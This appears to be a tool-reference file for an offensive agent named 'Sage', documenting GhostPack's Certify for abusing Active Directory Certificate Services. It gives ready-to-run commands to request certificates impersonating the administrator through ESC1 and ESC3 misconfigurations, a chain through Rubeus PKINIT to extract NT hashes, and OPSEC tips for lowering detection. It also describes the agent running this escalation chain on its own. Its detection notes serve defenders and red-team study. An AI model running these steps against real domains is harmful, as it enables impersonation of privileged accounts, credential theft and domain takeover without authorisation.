---
name: Certify
category: adcs
subcategories: [esc1, esc2, esc3, esc4, esc6, esc8, cert-request]
tradecraft_tags: [adcs, certificate, esc, ghostpack, pki, enrollment]
mitre_attack:
  - id: T1649
    name: Steal or Forge Authentication Certificates
source:
  url: https://github.com/GhostPack/Certify
  license: BSD-3-Clause
  maintained: true
binary_type: .net-assembly
binary_filename: Certify.exe
supported_os: [windows]
architecture: [x64, x86]
privilege_required: domain-user
network_required: true
detection_signal: |
  Certify generates LDAP queries against the PKI configuration container (CN=Public Key
  Services,CN=Services,CN=Configuration). These queries are not commonly issued by
  normal workstations. Certificate enrollment requests (ESC1/3) appear in the CA's
  Request database and Windows Event Log ID 4886 (certificate issued). MDI (Microsoft
  Defender for Identity) v3.200+ has signatures for anomalous certificate enrollment.
usage_examples:
  - description: Find all vulnerable certificate templates
    args: "find /vulnerable"
  - description: Find all templates and CAs (full audit)
    args: "find"
  - description: Request a certificate for another user via ESC1
    args: "request /ca:CASERVER\\\\CANAME /template:VulnTemplate /altname:administrator"
  - description: Request a certificate specifying the Subject Alternative Name
    args: "request /ca:CORPCA\\\\CORP-CA /template:User /altname:da@corp.local"
  - description: Download a certificate from the CA
    args: "download /ca:CASERVER\\\\CANAME /id:1337"
opsec_notes: |
  The `find` command issues LDAP queries to enumerate templates; these are logged as
  normal LDAP traffic but the query pattern (CN=Certificate Templates container walk)
  is unusual for workstations. Certificate requests via ESC1/2/3 are logged by the CA
  (Event 4886). Certificates issued via ESC8 (web enrollment relay) may leave web server
  logs. Prefer `/vulnerable` over full `find` to reduce LDAP query volume.
gotchas: |
  ESC1 requires the template to have ENROLLEE_SUPPLIES_SUBJECT flag AND the requesting
  account to have enrollment rights. Some ESC1-vulnerable templates restrict enrollment
  to specific groups — verify enrollment rights before attempting. Certificates from
  ESC1 are used with Rubeus `asktgt /certificate:` for PKINIT authentication; the
  resulting TGT then allows UnPAC-the-hash for an NT hash without any offline cracking.
  ESC8 (NTLM relay to web enrollment) requires a separate relay setup (e.g. ntlmrelayx).
related_ttps: [rubeus, whisker, forgecert, passthecert, pkinittools, sharpkrbrelay]
alternatives: [certipy, pkispy]
common_args:
  find:
    name: find
    description: Sub-command to enumerate CAs and certificate templates
    typical_values: [flag-only]
    required: true
  /vulnerable:
    description: Filter `find` output to only show templates with known ESC misconfigurations
    typical_values: [flag-only]
  /ca:
    description: CA server and CA name in format SERVER\\CANAME
    typical_values: ["CORPDC01\\CORP-CA", "KINGSLANDING\\SEVENKINGDOMS-CA"]
  /template:
    description: Certificate template name to request
    typical_values: [User, Computer, VulnerableTemplate]
  /altname:
    description: Subject Alternative Name to embed (ESC1 — requires ENROLLEE_SUPPLIES_SUBJECT)
    typical_values: ["administrator", "da@corp.local", "Administrator@essos.local"]
  /subject:
    description: Custom subject DN for the certificate request
    typical_values: ["CN=administrator,CN=Users,DC=corp,DC=local"]
  request:
    name: request
    description: Sub-command to request a certificate from a CA
    typical_values: [flag-only]
  /onbehalfof:
    description: Request cert on behalf of another user (ESC3 — agent enrollment)
    typical_values: ["CORP\\\\administrator"]
last_updated: 2026-05-29
---

# Certify

GhostPack's Active Directory Certificate Services (ADCS) enumeration and certificate
request tool. Certify finds misconfigured certificate templates (ESC1-ESC8) that allow
domain users to request certificates for other principals, effectively forging identity
proofs that Windows uses for Kerberos PKINIT authentication. The resulting certificates
feed directly into Rubeus for pass-the-cert → UnPAC-the-hash without any offline cracking.

## Typical use cases
- Enumerate all AD CS CAs and certificate templates in the domain (`find`)
- Identify ESC-vulnerable templates (`find /vulnerable`) — the fastest path to privilege escalation when ADCS is present
- Request a certificate for an admin account via ESC1 (template allows subject name supply)
- Request a certificate on behalf of another user via ESC3 (agent enrollment template)
- Download issued certificates from the CA database for manipulation

## How Sage uses this
Certify is the ADCS reconnaissance step before the Rubeus PKINIT chain. Sage runs
`find /vulnerable` first to discover exploitable templates; if ESC1/3/6/8 are present,
the next step is a `request` targeting a high-value account. The resulting PFX or PEM
certificate is fed to Rubeus `asktgt /certificate:` which lands a TGT; `/getcredentials`
then extracts the NT hash from the PAC without any offline cracking. This is often
the cleanest privilege escalation chain in environments where ADCS is present.

## Output
Certify outputs structured text to stdout:
- `find`: CA configuration block (CA name, DNS hostname, template list), then per-template
  attribute table. Vulnerable templates flagged with `[!]` prefix and ESC number.
- `request`: Base64-encoded certificate (PEM format) printed to stdout, plus the private
  key. Combine: save both sections to a `.pem` file, or convert with `openssl pkcs12`.
- `download`: Writes certificate to disk.

## OPSEC considerations
LDAP queries for `find` hit the PKI configuration container — not the standard user/computer
containers — so this generates unusual queries from a workstation perspective. The query
pattern is detectable by MDI and Elastic/Splunk LDAP correlation rules. Certificate requests
via `request` are permanently recorded in the CA's issued-certificates database. Defenders
can audit recent enrollments for anomalous subject names (`certutil -view`). Request timing
matters — ESC1 enrollment from a low-privileged account for the `administrator` UPN is a
strong detection signal.

## Full Reference

> Captured against Certify v1.1.0, 2026-05-29. Source: https://github.com/GhostPack/Certify README
> and "Certified Pre-Owned" whitepaper by Will Schroeder & Lee Christensen (SpecterOps).

### Sub-commands

| Sub-command | Description |
|-------------|-------------|
| `find` | Enumerate CAs and certificate templates; optionally filter to vulnerable |
| `request` | Request a certificate from a CA |
| `download` | Download a certificate from the CA by request ID |

### Full argument listing — `find`

| Arg | Description |
|-----|-------------|
| `/vulnerable` | Only show templates with known ESC misconfigurations |
| `/ca:X` | Only audit a specific CA (SERVER\CANAME format) |
| `/domain:X` | Target domain (defaults to current) |
| `/ldapserver:X` | Specific LDAP server to query |
| `/path:X` | Custom LDAP search base for templates |
| `/currentuser` | Only enumerate templates the current user can enroll in |
| `/json` | Output in JSON format (useful for automation) |

### Full argument listing — `request`

| Arg | Description |
|-----|-------------|
| `/ca:X` | Target CA (SERVER\CANAME format; required) |
| `/template:X` | Template name to enroll in (required) |
| `/altname:X` | Subject Alternative Name (UPN format, e.g. `admin@domain`) — requires ESC1 or ENROLLEE_SUPPLIES_SUBJECT |
| `/subject:X` | Custom subject DN |
| `/onbehalfof:X` | Request on behalf of another user (ESC3) — requires enrollment agent template |
| `/enrollcert:X` | Certificate to use for on-behalf-of enrollment |
| `/enrollcertpw:X` | Password for the enrollment cert's PFX |
| `/domain:X` | Target domain |
| `/machine` | Request a machine certificate (vs user) |

### ESC Vulnerability Reference

| ESC | Name | Condition | What Certify Does |
|-----|------|-----------|-------------------|
| ESC1 | Enrollee Supplies Subject | Template has ENROLLEE_SUPPLIES_SUBJECT flag | `request /altname:administrator` to get cert for admin |
| ESC2 | Any Purpose | Template has Any Purpose or SubCA EKU | Request cert that can be used for authentication |
| ESC3 | Enrollment Agent | Template allows enrollment agent use | `request /onbehalfof:X` to request cert for another user |
| ESC4 | Vulnerable Access Control | Low-priv user has GenericWrite/WriteDACL on template | Modify template to add ENROLLEE_SUPPLIES_SUBJECT flag |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | CA-wide flag set | Any template request can include arbitrary SAN |
| ESC8 | Web Enrollment NTLM relay | Web enrollment endpoint accessible without auth | Relay coerced NTLM auth to enroll a certificate |

### Output format

- `find`: Text table with CA details and per-template attributes; vulnerable templates marked `[!] Vulnerable Cert Template`
- `request`: Two PEM blocks — certificate and private key — base64 encoded to stdout
- Certificate can be used with Rubeus: `asktgt /user:X /certificate:<base64-pfx> /ptt`

### Converting Certify output to PFX for Rubeus

```
# Save the -----BEGIN CERTIFICATE----- and -----BEGIN RSA PRIVATE KEY----- blocks to cert.pem and key.pem
# Convert to PFX:
openssl pkcs12 -export -in cert.pem -inkey key.pem -out cert.pfx
# Base64 for Rubeus:
[Convert]::ToBase64String([IO.File]::ReadAllBytes("cert.pfx"))
```

### Source for this reference

- https://github.com/GhostPack/Certify (README full arg reference)
- "Certified Pre-Owned" whitepaper: https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
- SpecterOps blog: https://posts.specterops.io/certified-pre-owned-d95910965cd2
- Version: Certify v1.1.0 as of 2026-05-29
